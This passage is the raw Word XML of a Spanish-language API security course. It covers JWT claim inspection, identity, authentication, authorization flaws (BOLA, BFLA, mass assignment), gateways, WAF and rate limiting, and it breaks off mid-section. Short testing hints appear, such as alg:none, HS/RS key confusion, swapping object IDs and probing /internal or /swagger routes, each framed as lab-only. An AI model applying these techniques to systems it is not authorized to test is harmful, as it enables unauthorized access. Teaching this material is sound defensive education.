      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>tu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> ID token en https://jwt.io (es cliente: no viaja a ningún servidor) y leé </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>iss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aud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exp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auth_time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amr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>Cerrá sesión y explicá por qué ese cierre debe invalidar los artefactos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Frase: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>"No tocamos ningún sistema ajeno: miramos un billete al portador en nuestra propia billetera."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>6. La seguridad de API más allá del token: el cuerpo completo, dominio por dominio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2885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reference_arch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8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95057"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>Arquitectura de referencia de una API segura</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Las secciones anteriores cubren </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>tokens</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Sección 3, módulos M1–M11). Pero una API segura se construye en </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>todos</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> los dominios del sistema. Esta sección recorre, uno por uno, cada dominio de seguridad de API, con: qué protege, controles, fallas típicas, cómo se prueba y qué decía ya la bibliografía. Es el complemento que hace que la clase sea completa: el token es una puerta, no el edificio.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Quote"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Recordatorio ético: cualquier prueba ofensiva va contra laboratorios o entornos autorizados (ver Sección 0 y la Sección 5 de laboratorio).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>6.1 Identidad: humana, no humana y delegada</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué protege:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> saber </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>quién</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> o </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>qué</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> actúa, antes de decidir </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>qué puede hacer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Identidad humana:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> personas frente a un proveedor de identidad (OIDC), con sesión, MFA y claims (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>sub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acr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amr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auth_time</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Identidad no humana (NHI):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> service accounts, workloads, jobs de CI, dispositivos IoT. Su ciclo de vida —nacer, rotar, morir— es donde más falla la industria.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Identidad delegada:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> un servicio actuando en nombre de una persona (OAuth), con consentimiento, alcance y revocación.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Controles:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> federación de identidad, identidad de workload (p. ej. SPIFFE/SPIRE), credenciales efímeras (STS), rotación automática, mínimo privilegio, inventario y dueño por identidad.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Fallas típicas:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> cuentas compartidas, usuarios genéricos (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>admin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service</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>), credenciales de máquina sin expiración, secretos en repos y CI.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Cómo se prueba (lab/autorizado):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> inventariar NHIs; verificar que cada credencial expira y rota; buscar secretos en </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>tus</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> repos con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>gitleaks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color w:val="1F3B66"/>
        </w:rPr>
        <w:t>gghshield</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Fuentes:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> NIST SP 800-63-4 (2025); SPIFFE (CNCF, 2017-); GitGuardian, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>State of Secrets Sprawl 2026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6.2 Autenticación: patrones y su evolución</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué protege:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> comprobar la identidad declarada.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Factores:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> conocimiento (contraseña), posesión (dispositivo, clave), inherencia (biometría). MFA = dos de tipos distintos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Passwordless y passkeys:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> WebAuthn (W3C, 2019) resiste phishing por diseño; alineado con NIST SP 800-63-4 (2025).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Entre servicios:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> client credentials (RFC 6749 §4.4), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>private_key_jwt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (RFC 7523), mTLS (RFC 8705).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>APIs:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> bearer (RFC 6750), y su evolución sender-constrained: DPoP (RFC 9449).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Fallas típicas:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> MFA por SMS, sin rate limit, sin step-up para operaciones sensibles, tokens de vida larga, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>alg</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> tomado del token.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Cómo se prueba:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> N intentos contra </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>tu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> login y medir bloqueo; intentar </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>alg:none</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y confusión HS/RS contra tu lab (ver Sección 5 / Módulo M6).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Fuentes:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> OWASP API2:2023 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Broken Authentication</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>; NIST SP 800-63-4 (2025).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>6.3 Autorización: el corazón (donde vive BOLA)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué protege:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> decidir si </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>esta</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> identidad puede hacer </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>esta</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> acción sobre </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>este</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> objeto.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Modelos:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> RBAC (roles), ABAC (atributos), ReBAC (relaciones), PBAC (políticas). En la práctica se combinan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Niveles:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> a nivel de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>función</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (¿puede llamar </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>/admin</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">?) y a nivel de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>objeto</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (¿puede ver el pedido 5678?).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Policy as code:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> motores como OPA/Rego o Cedar para centralizar y versionar la política.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Mediación completa:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> toda decisión pasa por un punto de control; nada de "el front ya oculta el botón".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Fallas típicas (las tres de OWASP API):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>BOLA (Api1):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> token válido + objeto ajeno. La nº 1 de la lista; ~40 % de los ataques a APIs la involucran.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>BFLA (Api5):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> llamar funciones para las que no hay permiso.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>BOPLA (Api3) / mass assignment:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> controlar propiedades que no deberías (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>rol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saldo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Cómo se prueba (lab):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>tu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> token, cambiar el ID del objeto; con usuario normal, llamar endpoints de admin; enviar campos extra.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Fuentes:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> OWASP API Security Top 10 (2023); principios de Saltzer &amp; Schroeder (1975); </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>confused deputy</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Norm Hardy, 1988).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>6.4 Gateway, API management, service mesh y WAF</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué protege:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> el punto de entrada y el tránsito entre servicios.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>API Gateway:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> enrutamiento, autenticación, cuotas, transformación, observabilidad en un punto común.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>API management:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> catálogo, versiones, portales, claves, planes, analítica.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Service mesh:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> mTLS, identidad de workload y políticas entre servicios (este-oeste).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>WAF:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> filtrado de ataques conocidos; complementa, no reemplaza, la validación en la app.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Fallas típicas:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> rutas no documentadas que evitan el gateway, políticas solo en el borde y no en el interior, WAF como única defensa, configuración por defecto.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Cómo se prueba:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> buscar rutas alternativas (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>/v1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/internal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/swagger</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>, IP directa del servicio) que evadan el gateway; medir si las cuotas se aplican de forma consistente.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Fuentes:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> OWASP API8:2023 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Security Misconfiguration</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>; Zero Trust (NIST SP 800-207).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>6.5 Control de consumo y anti-abuso</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué protege:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> disponibilidad, costo y equidad del servicio.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Rate limiting</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (por IP, token, usuario, API key), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>cuotas</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> por plan, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>throttling</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, límites de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>concurrencia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Bot management:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> distinguir automatización legítima de abusiva.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Límites específicos:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> tamaño de request, profundidad de GraphQL, costo de consultas, paginación máxima.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Fallas típicas:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
